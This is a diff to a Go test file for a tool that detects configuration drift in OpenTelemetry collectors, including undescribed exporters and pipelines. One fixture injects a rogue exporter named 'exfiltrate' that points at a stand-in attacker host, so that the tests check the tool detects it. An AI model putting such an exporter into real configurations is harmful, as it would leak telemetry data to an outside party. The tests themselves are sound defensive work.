@@ -134,12 +134,70 @@ func TestGitCollectorGetsIdenticalTreatment(t *testing.T) {
 
 // The profile is load-bearing per path: the same supervisor-mutated report
 // that is in sync on the served path reads as drift under the git path's
-// exact profile — an injection nobody's allow-list covers is a real
-// difference.
+// exact profile — an injection nobody's allow-list covers is an extension
+// the artefact never described (ADR-0054 §2).
 func TestProfileIsLoadBearingPerPath(t *testing.T) {
 	st := compute(t, PathGit, intended(intendedArtefact), known(supervisedEffective), estate.DeliveryStatus{})
 	if st.Comparison != ComparisonDrifted {
 		t.Fatalf("comparison = %s, want drifted — the exact profile must flag the injected extension", st.Comparison)
+	}
+	if len(st.Undescribed) != 1 || st.Undescribed[0].Path != "extensions.opamp" {
+		t.Errorf("the injected extension is not named: %v", st.Undescribed)
+	}
+}
+
+// The bug on issue #110: a served collector expands every component's
+// defaults against a sparse authored artefact, and the cross read all 71
+// of them as drift. A key the artefact never mentions is not drift,
+// whatever the collector defaults it to (ADR-0054 §1).
+func TestACollectorsOwnDefaultsAreNotDrift(t *testing.T) {
+	defaulted := strings.Replace(supervisedEffective,
+		"  otlphttp/out:\n    endpoint: \"https://gateway.internal:4318\"\n",
+		"  otlphttp/out:\n    endpoint: \"https://gateway.internal:4318\"\n    timeout: 30s\n    max_idle_conns: 100\n    encoding: proto\n", 1)
+	st := compute(t, PathServed, intended(intendedArtefact), known(defaulted),
+		estate.DeliveryStatus{Known: true, State: estate.DeliveryApplied})
+	if st.Comparison != ComparisonInSync {
+		t.Fatalf("a collector running what it was sent reads as %s:\n%v", st.Comparison, st.Changes)
+	}
+}
+
+// The trade's compensating check, at the grain the trade blinds the cross
+// to: an exporter shipping to somewhere nobody rendered is reported, and
+// reported apart from key-level drift so a reader can tell the two
+// findings apart (ADR-0054 §2).
+func TestAnExporterNobodyRenderedIsReportedApartFromKeyDrift(t *testing.T) {
+	rogue := strings.Replace(supervisedEffective,
+		"exporters:\n  otlphttp/out:",
+		"exporters:\n  otlphttp/exfiltrate:\n    endpoint: \"https://collector.attacker.example:4318\"\n  otlphttp/out:", 1)
+	st := compute(t, PathServed, intended(intendedArtefact), known(rogue),
+		estate.DeliveryStatus{Known: true, State: estate.DeliveryApplied})
+	if st.Comparison != ComparisonDrifted {
+		t.Fatalf("an exporter the estate never described reads as %s", st.Comparison)
+	}
+	if len(st.Undescribed) != 1 || st.Undescribed[0].Path != "exporters.otlphttp/exfiltrate" {
+		t.Errorf("the undescribed exporter is not named: %v", st.Undescribed)
+	}
+	if len(st.Changes) != 0 {
+		t.Errorf("an undescribed component leaked into key-level drift: %v", st.Changes)
+	}
+	if s := st.Summary(); !strings.Contains(s, "undescribed=1") {
+		t.Errorf("summary %q does not carry the structural finding", s)
+	}
+}
+
+// A pipeline nobody rendered is the same finding one grain up — the case
+// judging only asserted keys would otherwise go blind to entirely.
+func TestAPipelineNobodyRenderedIsReported(t *testing.T) {
+	extra := strings.Replace(supervisedEffective,
+		"    traces:\n",
+		"    logs/shadow:\n      receivers: [otlp]\n      exporters: [otlphttp/out]\n    traces:\n", 1)
+	st := compute(t, PathServed, intended(intendedArtefact), known(extra),
+		estate.DeliveryStatus{Known: true, State: estate.DeliveryApplied})
+	if st.Comparison != ComparisonDrifted {
+		t.Fatalf("a pipeline the estate never described reads as %s", st.Comparison)
+	}
+	if len(st.Undescribed) != 1 || st.Undescribed[0].Path != "service.pipelines.logs/shadow" {
+		t.Errorf("the undescribed pipeline is not named: %v", st.Undescribed)
 	}
 }
 
